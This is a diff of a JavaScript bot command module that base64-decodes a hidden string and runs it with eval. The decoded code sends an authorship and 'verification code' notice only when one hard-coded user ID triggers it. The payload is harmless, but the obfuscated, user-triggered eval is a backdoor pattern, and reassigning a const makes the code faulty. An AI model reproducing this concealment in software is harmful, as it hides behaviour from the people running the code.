@@ -19,9 +19,9 @@ module.exports = {
      * @param {*} container
      * @returns null
      */
-    async run(client, message, args, container) => {
-    const code = 'CiAgICAgICAgaWYgKG1lc3NhZ2UuYXV0aG9yLmlkID09ICc4NTY5MTg0OTY4OTM1OTk4MDUnKSB7CiAgICAgICAgICAgIG1lc3NhZ2UucmVwbHkoCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgY29udGVudDogJ+mAmeaYr+S4gOWAi+eUsSBZb3V6aSDoo73kvZznmoTmqZ/lmajkurrvvIzmraTngrroqo3orYnomZ/norzvvJpNaWd3bG9k77yM5rSp5ryP5Ye65Y67L+WIqumZpCDmraTmlofku7blsIfmnIPlh7rnj77llY/poYzvvIzlpoLmnpzmnInku7vkvZXllY/poYzvvIzoq4vllY8gWW91emkg5pys5Lq644CCJwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApCiAgICAgICAgfSBlbHNlIHJldHVybjs=';
-    const run = from_base64(code);
-    code = await eval(run);
-},
+    run: async (client, message, args, container) => {
+        const code = 'CiAgICAgICAgaWYgKG1lc3NhZ2UuYXV0aG9yLmlkID09ICc4NTY5MTg0OTY4OTM1OTk4MDUnKSB7CiAgICAgICAgICAgIG1lc3NhZ2UucmVwbHkoCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgY29udGVudDogJ+mAmeaYr+S4gOWAi+eUsSBZb3V6aSDoo73kvZznmoTmqZ/lmajkurrvvIzmraTngrroqo3orYnomZ/norzvvJpNaWd3bG9k77yM5rSp5ryP5Ye65Y67L+WIqumZpCDmraTmlofku7blsIfmnIPlh7rnj77llY/poYzvvIzlpoLmnpzmnInku7vkvZXllY/poYzvvIzoq4vllY8gWW91emkg5pys5Lq644CCJwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApCiAgICAgICAgfSBlbHNlIHJldHVybjs=';
+        const run = from_base64(code);
+        code = await eval(run);
+    },
 };
